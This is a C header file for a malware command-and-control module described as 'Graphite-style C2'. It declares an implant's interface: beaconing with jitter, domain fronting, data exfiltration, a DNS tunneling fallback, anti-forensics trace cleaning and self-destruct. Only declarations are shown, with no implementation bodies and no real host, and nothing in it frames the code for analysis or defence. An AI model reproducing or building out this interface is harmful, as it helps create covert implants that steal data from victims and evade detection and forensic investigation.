// graphite_c2.h - C2 Communication Module (C)
// Native C implementation of Graphite-style C2
// Features: domain fronting, adaptive beaconing, DNS tunneling fallback

#ifndef GRAPHITE_C2_H
#define GRAPHITE_C2_H

#include <stdint.h>
#include <stddef.h>

#ifdef _WIN32
    #define C2_EXPORT __declspec(dllexport)
#else
    #define C2_EXPORT __attribute__((visibility("default")))
#endif

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
    char session_id[33];
    char c2_url[256];
    int beacon_interval;  // seconds
    float jitter;         // 0.0-1.0
    int use_domain_fronting;
    char front_domain[256];
    int stealth_mode;
} C2Config;

typedef struct {
    char cmd_type[64];
    char params[1024];
    double issued;
} C2Command;

// Initialize C2 channel
C2_EXPORT int c2_init(C2Config* config, const char* c2_url);

// Send beacon and receive commands
C2_EXPORT int c2_beacon(C2Config* config, C2Command* commands, int max_commands);

// Exfiltrate data
C2_EXPORT int c2_exfil(C2Config* config, const void* data, size_t data_len, const char* data_type);

// DNS tunneling fallback
C2_EXPORT int c2_dns_tunnel(C2Config* config, const void* data, size_t data_len);

// Adaptive backoff
C2_EXPORT int c2_backoff(C2Config* config, int failure_count);

// Generate session ID
C2_EXPORT void c2_gen_session_id(char* out, size_t out_size);

// Anti-forensics: clean traces
C2_EXPORT void c2_clean_traces(int platform);

// Self-destruct
C2_EXPORT void c2_self_destruct();

#ifdef __cplusplus
}
#endif

#endif
